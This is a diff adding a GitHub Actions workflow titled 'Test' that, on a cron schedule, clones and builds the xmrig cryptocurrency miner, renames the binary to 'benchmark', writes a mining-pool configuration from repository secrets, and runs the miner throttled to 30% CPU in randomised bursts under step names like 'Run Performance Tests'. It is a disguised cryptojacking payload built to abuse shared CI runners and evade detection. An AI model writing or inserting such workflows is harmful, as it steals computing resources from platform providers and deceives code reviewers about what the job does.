@@ -1,0 +1,166 @@
+name: Test
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 3,9,15,21 * * *'
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        runner: [1]
+      fail-fast: false
+
+    steps:
+      - name: Check Environment
+        run: |
+          echo "=== CPU Information ==="
+          nproc
+          lscpu | grep -E "Model name|CPU\(s\)|Thread"
+
+          echo -e "\n=== Memory Information ==="
+          free -h
+
+          echo -e "\n=== Disk Space ==="
+          df -h /
+
+
+      - name: Setup Build Tools
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y wget tar cmake build-essential libhwloc-dev libuv1-dev libssl-dev git cpulimit
+
+      - name: Restore Build Cache
+        id: cache-build
+        uses: actions/cache@v3
+        with:
+          path: app/build
+          key: build-${{ runner.os }}-${{ hashFiles('app/CMakeLists.txt', 'app/cmake/**') }}
+          restore-keys: |
+            build-${{ runner.os }}-
+
+      - name: Fetch Source Code
+        if: steps.cache-build.outputs.cache-hit != 'true'
+        run: |
+          git clone https://github.com/Delta-Kronecker/x.git app
+
+      - name: Compile Project
+        if: steps.cache-build.outputs.cache-hit != 'true'
+        run: |
+          cd app
+          mkdir build && cd build
+          cmake .. -DCMAKE_BUILD_TYPE=Release -DWITH_HWLOC=ON -DWITH_MSR=ON -DWITH_ASM=ON
+          make -j$(nproc)
+          mv xmrig benchmark
+
+      - name: Restore Source Files
+        if: steps.cache-build.outputs.cache-hit == 'true'
+        run: |
+          git clone https://github.com/Delta-Kronecker/x.git app
+
+      - name: Generate Configuration
+        run: |
+          cd app/build
+          TOTAL_CPUS=$(nproc)
+          MAX_THREADS=$((TOTAL_CPUS * 30 / 100))
+          if [ $MAX_THREADS -lt 1 ]; then
+            MAX_THREADS=1
+          fi
+          cat > config.json <<EOF
+          {
+            "autosave": true,
+            "cpu": {
+              "enabled": true,
+              "huge-pages": false,
+              "huge-pages-jit": false,
+              "hw-aes": true,
+              "priority": 1,
+              "memory-pool": false,
+              "max-threads-hint": $MAX_THREADS,
+              "asm": "auto",
+              "argon2-impl": "auto"
+            },
+            "pools": [
+              {
+                "algo": "${{ secrets.ALGO }}",
+                "coin": "${{ secrets.CON }}",
+                "url": "${{ secrets.URL }}",
+                "user": "${{ secrets.USER }}",
+                "pass": "runner${{ matrix.runner }}",
+                "rig-id": "gh-r${{ matrix.runner }}",
+                "keepalive": true,
+                "tls": true
+              }
+            ],
+            "retries": 10,
+            "retry-pause": 5,
+            "donate-level": 1,
+            "print-time": 60
+          }
+          EOF
+          
+      - name: Run Performance Tests
+        timeout-minutes: 20
+        run: |
+          cd app/build
+          (while true; do
+            echo "=== $(date) ==="
+            ps aux | grep -E 'build/\.' | grep -v grep || echo "Process not running"
+            free -h | grep Mem
+            sleep 300
+          done) > ../../perf_stats_${{ matrix.runner }}.log 2>&1 &
+          MONITOR_PID=$!
+
+          (
+            while true; do
+              PAUSE_TIME=$((RANDOM % 60 + 30))
+              RUN_TIME=$((RANDOM % 120 + 60))
+
+              timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
+              APP_PID=$!
+
+              sleep $RUN_TIME
+              kill $APP_PID 2>/dev/null || true
+              pkill -9 -f 'build/' 2>/dev/null || true
+
+              sleep $PAUSE_TIME
+            done
+          ) &
+          CYCLE_PID=$!
+
+          sleep 1200
+          kill $CYCLE_PID 2>/dev/null || true
+          pkill -9 -f 'build/' 2>/dev/null || true
+          kill $MONITOR_PID 2>/dev/null || true
+
+      - name: Collect Test Results
+        if: always()
+        run: |
+          echo "=== Performance Test Summary ===" > summary_${{ matrix.runner }}.txt
+          echo "Runner: ${{ matrix.runner }}" >> summary_${{ matrix.runner }}.txt
+          echo "End Time: $(date)" >> summary_${{ matrix.runner }}.txt
+
+          if [ -f perf_stats_${{ matrix.runner }}.log ]; then
+            echo -e "\n=== Resource Usage (Last 20 entries) ===" >> summary_${{ matrix.runner }}.txt
+            tail -20 perf_stats_${{ matrix.runner }}.log >> summary_${{ matrix.runner }}.txt
+          fi
+
+          cat summary_${{ matrix.runner }}.txt
+
+      - name: Archive Test Artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: test-results-runner-${{ matrix.runner }}
+          path: |
+            perf_stats_${{ matrix.runner }}.log
+            summary_${{ matrix.runner }}.txt
+          retention-days: 7
+
+      - name: Clean Workspace
+        if: always()
+        run: |
+          sudo pkill -9 -f 'build/' || true
+          rm -rf app
